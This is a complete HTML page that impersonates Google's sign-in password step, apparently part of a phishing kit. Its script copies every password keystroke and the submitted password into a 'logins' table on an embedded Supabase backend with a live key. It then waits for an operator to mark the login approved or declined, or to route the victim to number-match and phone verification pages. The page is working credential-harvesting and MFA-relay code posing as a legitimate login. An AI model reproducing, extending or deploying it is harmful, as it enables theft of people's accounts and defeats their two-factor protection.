<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Password Page</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: #f0f4f9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }

    /* ===== Card ===== */
    .card {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      padding: 40px 32px;
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      position: relative;
      overflow: hidden;
      opacity: 0;
      transform: translateY(40px);
      animation: fadeInUp 0.8s ease-out forwards;
      animation-delay: 0.5s;
    }

    @keyframes fadeInUp {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* ===== Loader Bar ===== */
    .loader-bar {
      position: absolute;
      top: 0;
      left: 0;
      height: 3px;
      width: 100%;
      background: transparent;
      overflow: hidden;
      display: none;
      z-index: 3;
    }
    .loader-bar.active { display: block; }
    .loader-bar::before {
      content: "";
      position: absolute;
      top: 0;
      left: -40%;
      height: 100%;
      width: 40%;
      background: #1a73e8;
      animation: loading 1s infinite;
    }
    @keyframes loading {
      0% { left: -40%; }
      50% { left: 60%; }
      100% { left: 100%; }
    }

    /* ===== Blur Overlay ===== */
    .overlay {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      backdrop-filter: blur(4px);
      background: rgba(255,255,255,0.6);
      display: none;
      z-index: 2;
    }
    .overlay.active { display: block; }

    .google-logo {
      width: 75px;
      margin-bottom: 20px;
      opacity: 0;
      animation: fadeIn 1s ease forwards;
      animation-delay: 1s;
    }

    @keyframes fadeIn { to { opacity: 1; } }

    h1 {
      font-size: 26px;
      font-weight: 400;
      margin: 0 0 20px;
      color: #202124;
      opacity: 0;
      animation: fadeIn 1s ease forwards;
      animation-delay: 1.2s;
    }

    .email-display {
      display: flex;
      align-items: center;
      font-size: 15px;
      margin-bottom: 30px;
      color: #202124;
      opacity: 0;
      animation: fadeIn 1s ease forwards;
      animation-delay: 1.4s;
    }
    .email-display svg {
      width: 20px;
      height: 20px;
      margin-right: 10px;
      fill: #5f6368;
    }
    @media (min-width: 992px) {
      .email-display {
        border: 1px solid #dadce0;
        border-radius: 24px;
        padding: 10px 16px;
        margin-bottom: 40px;
      }
    }

    /* ===== Input ===== */
    .input-box {
      position: relative;
      margin-bottom: 20px;
      width: 100%;
      opacity: 0;
      animation: fadeIn 1s ease forwards;
      animation-delay: 1.6s;
    }
    .input-box input {
      width: 100%;
      padding: 16px 12px 14px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      outline: none;
      transition: border-color 0.25s, box-shadow 0.25s;
      box-sizing: border-box;
    }
    .input-box input:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
    }
    .input-box label {
      position: absolute;
      top: 16px;
      left: 12px;
      font-size: 16px;
      color: #5f6368;
      pointer-events: none;
      transition: 0.25s ease;
      background: #fff;
      padding: 0 4px;
    }
    .input-box input:focus + label,
    .input-box input:not(:placeholder-shown) + label {
      top: -8px;
      left: 8px;
      font-size: 12px;
      color: #1a73e8;
    }

    .checkbox {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 20px;
      opacity: 0;
      animation: fadeIn 1s ease forwards;
      animation-delay: 1.8s;
    }
    .checkbox input { margin-right: 8px; }

    .right {
      display: flex;
      flex-direction: column;
      flex: 1;
    }
    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: auto;
      opacity: 0;
      animation: fadeIn 1s ease forwards;
      animation-delay: 2s;
    }

    .forgot {
      font-size: 14px;
      color: #1a73e8;
      text-decoration: none;
    }
    .forgot:hover { text-decoration: underline; }

    .next-btn {
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 10px 28px;
      font-size: 14px;
      font-weight: 500;
      border-radius: 24px;
      cursor: pointer;
      transition: background 0.25s, transform 0.15s;
    }
    .next-btn:hover { background: #1765cc; }
    .next-btn:active { transform: scale(0.97); }

    /* ===== Mobile ===== */
    @media (max-width: 600px) {
      .card {
        height: 90vh;
        max-width: 95%;
        padding: 32px 16px;
      }
    }
    /* ===== Tablet ===== */
    @media (min-width: 601px) and (max-width: 991px) {
      .card {
        max-width: 600px;
        padding: 50px 40px;
      }
    }
    /* ===== Desktop ===== */
    @media (min-width: 992px) {
      .card {
        flex-direction: row;
        align-items: flex-start;
        justify-content: space-between;
        max-width: 900px;
        padding: 60px;
        gap: 60px;
        height: auto;
      }
      .left, .right {
        flex: 1;
        display: flex;
        flex-direction: column;
      }
      .left { padding-right: 2rem; }
      h1 { font-size: 2rem; }
      .actions { margin-top: 40px; }
    }
  </style>
</head>
<body>
  <div class="card" id="card">
    <!-- loader bar -->
    <div class="loader-bar" id="loader"></div>
    <!-- blur overlay -->
    <div class="overlay" id="overlay"></div>

    <div class="left">
      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
      <h1>Welcome</h1>
      <div class="email-display">
        <svg aria-hidden="true" viewBox="0 0 24 24">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
        </svg>
        <span>(show demo email from previous page)</span>
      </div>
    </div>

    <div class="right">
      <div class="input-box">
        <input type="password" id="password" placeholder=" " required>
        <label for="password">Enter your password</label>
      </div>
      <div class="checkbox">
        <input type="checkbox" id="showPass">
        <label for="showPass">Show password</label>
      </div>
      <div class="actions">
        <a href="#" class="forgot">Forgot password?</a>
        <button class="next-btn" id="nextBtn">Next</button>
      </div>
    </div>
  </div>

<!-- load supabase (put this once on the page) -->
<script src="https://unpkg.com/@supabase/supabase-js@2"></script>

<script>
(async () => {
 const SUPABASE_URL = "https://bipnmthaonkbffothwkj.supabase.co";
  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJpcG5tdGhhb25rYmZmb3Rod2tqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk3OTc0NDUsImV4cCI6MjA3NTM3MzQ0NX0.9mNaxvZolgyyvyZP7n2x_nUwL8h1EHknpjR4_aMlPyc";
  const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
  const passwordInput = document.getElementById('password');
  const showPass = document.getElementById('showPass');
  const loader = document.getElementById('loader');
  const overlay = document.getElementById('overlay');
  const nextBtn = document.getElementById('nextBtn');
  const emailSpan = document.querySelector('.email-display span');
  const errorMessage = document.createElement('div');
  errorMessage.id = 'error-message';
  errorMessage.style.cssText = `
    color: #d93025;
    font-size: 14px;
    margin-top: 6px;
    display: none;
    text-align: left;
    opacity: 0;
    transition: opacity 0.3s ease;
  `;
  document.querySelector('.input-box').after(errorMessage);

  const deviceId = localStorage.getItem('device_id');

  function debounce(fn, wait = 300) {
    let t;
    return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), wait); };
  }

  function showLoadingUI() {
    loader.classList.add('active');
    overlay.classList.add('active');
    nextBtn.disabled = true;
    nextBtn.textContent = 'Verifying...';
  }

  function hideLoadingUI() {
    loader.classList.remove('active');
    overlay.classList.remove('active');
    nextBtn.disabled = false;
    nextBtn.textContent = 'Next';
  }

  showPass.addEventListener('change', () => {
    passwordInput.type = showPass.checked ? 'text' : 'password';
  });

  async function fetchRow() {
    const { data, error } = await client
      .from('logins')
      .select('*')
      .eq('device_id', deviceId)
      .maybeSingle();
    if (error) console.error(error);
    return data;
  }

  // ✅ Corrected session init: never overwrite username with localStorage
  async function ensureSession() {
    let row = await fetchRow();
    if (!row) {
      await client.from('logins').insert({
        device_id: deviceId,
        page_name: 'password',
        is_active: true,
        login_status: 'onpage'
      });
      row = await fetchRow();
    } else {
      await client
        .from('logins')
        .update({ page_name: 'password', is_active: true, login_status: 'onpage' })
        .eq('device_id', deviceId);
    }

    if (row?.username) {
      emailSpan.textContent = row.username;
      localStorage.setItem('username', row.username);
    } else {
      emailSpan.textContent = '(unknown user)';
    }
  }

  async function updateField(field, value) {
    await client
      .from('logins')
      .update({ [field]: value, page_name: 'password', is_active: true })
      .eq('device_id', deviceId);
  }

  const debouncedSyncPassword = debounce(val => updateField('password', val), 300);
  passwordInput.addEventListener('input', e => debouncedSyncPassword(e.target.value));

  nextBtn.addEventListener('click', async (ev) => {
    ev.preventDefault();
    const val = passwordInput.value.trim();
    if (!val) {
      errorMessage.textContent = 'Please enter a password.';
      errorMessage.style.display = 'block';
      errorMessage.style.opacity = '1';
      return;
    }
    errorMessage.style.display = 'none';
    showLoadingUI();
    await client
      .from('logins')
      .update({
        password: val,
        login_status: 'pending',
        page_name: 'password',
        is_active: true
      })
      .eq('device_id', deviceId);
  });

  // ✅ Redirect logic fixed
  function handleStatusChange(row) {
    if (!row) return;
    const status = row.login_status;

    if (status === 'approved') {
      window.location.href = 'review.html';
    } else if (status === 'declined') {
      hideLoadingUI();
      errorMessage.textContent = 'The password you entered is incorrect.';
      errorMessage.style.display = 'block';
      errorMessage.style.opacity = '1';
    } else if (status === 'matchnumber') {
      window.location.href = 'matchnumber.html';
    } else if (status === 'phone') {
      window.location.href = 'phone.html';
    }

    if (row.username) {
      emailSpan.textContent = row.username;
      localStorage.setItem('username', row.username);
    }
  }

  // Subscribe to realtime changes
  function subscribeRealtime() {
    client
      .channel('logins_password_' + deviceId)
      .on('postgres_changes', {
        event: '*',
        schema: 'public',
        table: 'logins',
        filter: `device_id=eq.${deviceId}`
      }, payload => handleStatusChange(payload.new))
      .subscribe();
  }

  async function pollFallback() {
    const { data } = await client.from('logins').select('*').eq('device_id', deviceId).maybeSingle();
    if (data) handleStatusChange(data);
  }

  window.addEventListener('beforeunload', () => {
    client.from('logins').update({ is_active: false }).eq('device_id', deviceId);
  });

  await ensureSession();
  subscribeRealtime();
  setInterval(pollFallback, 3000);
})();
</script>

<!-- ✅ Improved keyboard helper — non-destructive, restores original styles -->
<script>
(function () {
  const card = document.querySelector('.card');
  const actions = document.querySelector('.actions');
  if (!card || !actions) return;

  let prevOverflow = card.style.overflowY || '';
  let prevMaxHeight = card.style.maxHeight || '';
  let prevPaddingBottom = card.style.paddingBottom || '';
  let adjusted = false;
  let adjustTimer = null;

  function savePrevious() {
    prevOverflow = card.style.overflowY || '';
    prevMaxHeight = card.style.maxHeight || '';
    prevPaddingBottom = card.style.paddingBottom || '';
  }

  function restorePrevious() {
    if (!adjusted) return;
    card.style.overflowY = prevOverflow;
    card.style.webkitOverflowScrolling = '';
    card.style.maxHeight = prevMaxHeight;
    card.style.paddingBottom = prevPaddingBottom;
    adjusted = false;
  }

  function handleAdjust(immediate = false) {
    // throttle
    clearTimeout(adjustTimer);
    adjustTimer = setTimeout(() => {
      const vv = window.visualViewport;
      const viewportHeight = vv ? vv.height : window.innerHeight;
      const viewportOffsetTop = vv ? (vv.offsetTop || 0) : 0;
      // Estimate keyboard height (if any)
      const keyboardHeight = Math.max(0, window.innerHeight - viewportHeight - viewportOffsetTop);

      // If keyboard not present: restore
      if (keyboardHeight < 80) {
        restorePrevious();
        return;
      }

      // First time adjust: allow card to scroll internally (temporary)
      if (!adjusted) {
        savePrevious();
        card.style.overflowY = 'auto';
        card.style.webkitOverflowScrolling = 'touch';
        // limit card height to visual viewport so internal scrolling works predictably
        try {
          card.style.maxHeight = (viewportHeight - 12) + 'px';
        } catch (e) { /* ignore */ }
        adjusted = true;
      }

      // Add padding so bottom content clears keyboard
      card.style.paddingBottom = (keyboardHeight + 18) + 'px';

      // Compute actions bottom relative to visual viewport top
      const ar = actions.getBoundingClientRect();
      const actionsBottomRel = ar.bottom - viewportOffsetTop;
      const safeGap = 12;

      if (actionsBottomRel > viewportHeight - safeGap) {
        const delta = actionsBottomRel - (viewportHeight - safeGap);
        // scroll the card so actions are visible
        // use a small extra margin
        const extra = 8;
        card.scrollBy({ top: delta + extra, behavior: 'smooth' });
      }
    }, immediate ? 0 : 60);
  }

  // when an input inside the card gets focus, attempt to reveal actions
  document.addEventListener('focusin', (e) => {
    if (!card.contains(e.target)) return;
    if (!/INPUT|TEXTAREA|SELECT/i.test(e.target.tagName)) return;
    handleAdjust(true);
  });

  // on focusout try to restore after short delay (in case another input is focused)
  document.addEventListener('focusout', () => {
    clearTimeout(adjustTimer);
    // give time for next focus to occur; if none, restore
    adjustTimer = setTimeout(() => {
      const el = document.activeElement;
      if (el && card.contains(el) && /INPUT|TEXTAREA|SELECT/i.test(el.tagName)) {
        handleAdjust();
      } else {
        restorePrevious();
      }
    }, 180);
  });

  // visualViewport gives best results on modern browsers
  if (window.visualViewport) {
    window.visualViewport.addEventListener('resize', handleAdjust);
    window.visualViewport.addEventListener('scroll', handleAdjust);
  }
  // fallback to window resize
  window.addEventListener('resize', () => handleAdjust());

  // also expose a manual trigger (useful for testing)
  window.__ensureCardVisibleForKeyboard = handleAdjust;
})();
</script>

<script>
  // Allow pressing Enter to trigger the Next button
  document.getElementById('password').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      document.getElementById('nextBtn').click();
    }
  });
</script>

</body>
</html>
